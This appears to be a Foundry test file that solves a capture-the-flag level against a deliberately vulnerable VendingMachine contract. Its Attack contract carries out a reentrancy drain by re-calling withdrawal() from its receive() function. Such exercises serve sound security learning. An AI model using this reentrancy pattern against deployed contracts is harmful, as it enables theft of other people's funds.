// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernautDao/level4/VendingMachine.sol";

contract Attack {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    // reentrancy attack of withdrawal functions
    receive() external payable {
        if (address(victim).balance > 0) {
            VendingMachine(victim).withdrawal();
        }
    }
}

contract VendingTest is Test {
    VendingMachine public vending;
    Attack public attack;

    function setUp() public {
        vending = new VendingMachine{value: 1 ether}();
        attack = new Attack(address(vending));
    }

    function testAttack() public {
        vm.deal(address(attack), 0.5 ether);
        vm.startPrank(address(attack));

        vending.deposit{value: 0.5 ether}();

        assertEq(vending.getMyBalance(), 0.5 ether);

        vending.getPeanuts(2);
        assertEq(vending.getMyBalance(), 0.3 ether);
        assertEq(vending.getPeanutsBalance(), 1998);
        assertEq(vending.peanuts(address(attack)), 2);

        vending.withdrawal();
        assertEq(vending.getMyBalance(), 0);
    }
}
